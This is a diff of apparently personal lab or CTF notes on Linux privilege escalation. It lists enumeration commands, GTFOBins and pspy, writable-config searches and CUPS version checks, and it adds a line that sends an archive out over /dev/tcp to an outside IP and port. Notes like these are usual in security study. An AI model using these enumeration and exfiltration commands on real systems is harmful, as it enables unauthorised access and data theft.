@@ -3,7 +3,8 @@
 1. https://computingforgeeks.com/linux-privilege-escalation-guide-kali/#google_vignette
 2. https://gtfobins.org/
 3. abuse sudo
-4. ss -tlnp
+4. ss -tlnp 
+ss -lnx # for sockets 
 5. writeable config find /etc -writable 2>/dev/null 
 5. avoid proccess quit 
 ```
@@ -31,5 +32,8 @@ curl -s -c /tmp/cj -b /tmp/cj -d "action=contract_claim" \
 10. pspy https://github.com/DominicBreuker/pspy  
 pspy64 -pf -i 1000
 
-11. port 631 cpus server
+11. port 631 cpus printer server
 cups-config --version for sniffer
+
+12. send file via dev tcp
+cat < ./g-admin-api.tar.gz  > /dev/tcp/10.10.17.159/4445
